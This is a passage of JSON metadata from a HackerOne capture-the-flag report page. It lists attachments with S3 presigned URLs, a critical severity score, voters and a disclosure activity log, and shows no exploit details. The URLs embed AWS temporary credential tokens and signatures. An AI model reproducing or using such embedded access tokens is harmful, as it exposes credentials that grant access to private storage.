gnedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=b19fcdfe67ef12317a8542279e97a1b6f41e3c2e21684d5121768241da4df648","file_size":3390,"type":"text/plain"},{"id":439687,"file_name":"main_1.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/687/5edd6fc76f0a9fe0b5dc63741aca3de15cc79db1/main_1.py?response-content-disposition=attachment%3B%20filename%3D%22main_1.py%22%3B%20filename%2A%3DUTF-8%27%27main_1.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T061201Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026X-Amz-Signature=42ecdeafabaed9d0afd99c95e1110ad2e8a5f167f3d445f945d975a059f43382","file_size":2367,"type":"text/x-python"}],"allow_singular_disclosure_at":"2019-05-08T15:55:42.852Z","allow_singular_disclosure_after":-51891378.52148521,"singular_disclosure_allowed":true,"vote_count":9,"voters":["checkm50","ajxchapman","0xacb","mygf","0x08","sorted_one","sinswriter","daringkid","pchibuzor"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4492844,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for the amazing report! We'll be announcing the winners shortly, so we'll let you know if you're one of the reports selected. Going to close this and then request public disclosure now.","markdown_message":"\u003cp\u003eThank you for the amazing report! We\u0026#39;ll be announcing the winners shortly, so we\u0026#39;ll let you know if you\u0026#39;re one of the reports selected. Going to close this and then request public disclosure now.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-05T18:33:59.686Z","updated_at":"2019-04-05T18:33:59.686Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ajxchapman","url":"/ajxchapman"},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509091,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:42.813Z","updated_at":"2019-04-08T15:55:42.813Z","first_to_agree":true,"actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4509092,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-08T15:55:48.766Z","updated_at":"2019-04-08T15:55:48.766Z","actor":{"username":"daeken","cleared":true,"url":"/daeken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ougW8NiEP3NvYjkc2rnRuaat/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"50m-ctf","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}